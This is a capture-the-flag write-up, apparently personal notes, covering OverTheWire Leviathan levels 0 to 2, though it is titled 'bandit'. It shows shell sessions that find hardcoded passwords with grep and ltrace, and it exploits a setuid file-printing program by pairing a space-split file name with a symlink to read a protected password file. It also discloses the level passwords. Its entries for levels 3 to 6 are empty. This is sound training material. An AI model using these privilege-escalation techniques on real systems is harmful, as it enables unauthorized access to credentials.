###bandit war games - Viraj Jayasekara

######Level0:
```
**//login to the level0 using p/w leviathan0//**

[Viraj@server Desktop]$ ssh leviathan0@leviathan.labs.overthewire.org
```

######Level0->Level1:
```
//inside the home directory, there was a hidden directory called ".backup" and there was a file called "bookmarks.html" indide that. 'cat bookmarks.html | grep password' command was used to go through within this file to find the keyword 'password'. Therefore the password for the next level: rioGegei8m. //

leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
leviathan0@melinda:~$ cd .backup
leviathan0@melinda:~/.backup$ ls
bookmarks.html
leviathan0@melinda:~/.backup$ cat bookmarks.html | grep password
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
leviathan0@melinda:~/.backup$ 
```

######Level1->Level2:
```
//inside the home directory, there was binary file included. When it was executed, it asked for a password. Accordind to a movie called 'Hackers', the most common passwords are love, sex, secret and god. //

leviathan1@melinda:~$ ls
check

//use password as love//

leviathan1@melinda:~$ ./check
password: love
Wrong password, Good Bye ...

//trace binary file//

leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
printf("password: ")                              = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: love
)      = 108
getchar(0x8048680, 47, 0x804a000, 0x8048642)      = 111
getchar(0x8048680, 47, 0x804a000, 0x8048642)      = 118
strcmp("lov", "sex")                              = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)              = 29
+++ exited (status 0) +++

//it is possible to identify that the password checking mechanism uses string comparsion to compare the correct password.And it is compared with 'sex'.// 

//useing 'sex' as the password//

leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2

//password is correct and password to the next level can be obtained by default password location//

$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
$ 
```

######Level2->Level3:
```
//check inside home directory. A binaey file called "printfile" was found//

leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile

//execute the file//

leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename

//to exectue the file, it requires a file to be passed as an argument. Therefore a temp file was created on /tmp/vv location//

leviathan2@melinda:~$ mkdir /tmp/vv 
leviathan2@melinda:~$ touch /tmp/vv/file\ tmp.txt
leviathan2@melinda:~$ cd /tmp/vv

//check whether the temp file was created//

leviathan2@melinda:/tmp/vv$ ls -la
total 1692
drwxrwxr-x   2 leviathan2 leviathan2    4096 Oct  4 07:38 .
drwxrwx-wt 153 root       root       1724416 Oct  4 07:38 ..
-rw-rw-r--   1 leviathan2 leviathan2       0 Oct  4 07:38 file tmp.txt

//try to exectute 'printfile' while tracing//

leviathan2@melinda:/tmp/vv$ ltrace ~/printfile "file tmp.txt"
__libc_start_main(0x804852d, 2, 0xffffd754, 0x8048600 <unfinished ...>
access("file tmp.txt", 4)                         = 0
snprintf("/bin/cat file tmp.txt", 511, "/bin/cat %s", "file tmp.txt") = 21
system("/bin/cat file tmp.txt"/bin/cat: file: No such file or directory
/bin/cat: tmp.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                            = 256
+++ exited (status 0) +++

//try to create a symlink to the file that contains level3 password//

leviathan2@melinda:/tmp/vv$ ln -s /etc/leviathan_pass/leviathan3 /tmp/vv/file

//it is visible that a seperate symlink called "file" was created//

leviathan2@melinda:/tmp/vv$ ls -la
total 1692
drwxrwxr-x   2 leviathan2 leviathan2    4096 Oct  4 07:41 .
drwxrwx-wt 153 root       root       1724416 Oct  4 07:41 ..
lrwxrwxrwx   1 leviathan2 leviathan2      30 Oct  4 07:41 file -> /etc/leviathan_pass/leviathan3
-rw-rw-r--   1 leviathan2 leviathan2       0 Oct  4 07:38 file tmp.txt

//try to read the "file"//

leviathan2@melinda:/tmp/vv$ ~/printfile "file"
You cant have that file...

//try to read "file tmp.txt". and password for the next level was displayed//

leviathan2@melinda:/tmp/vv$ ~/printfile "file tmp.txt"
Ahdiemoo1j
/bin/cat: tmp.txt: No such file or directory
leviathan2@melinda:/tmp/vv$ 
```

######Level3->Level4:
```

```

######Level4->Level5:
```

```

######Level5->Level6:
```

```

######Level6->Level7:
```

```
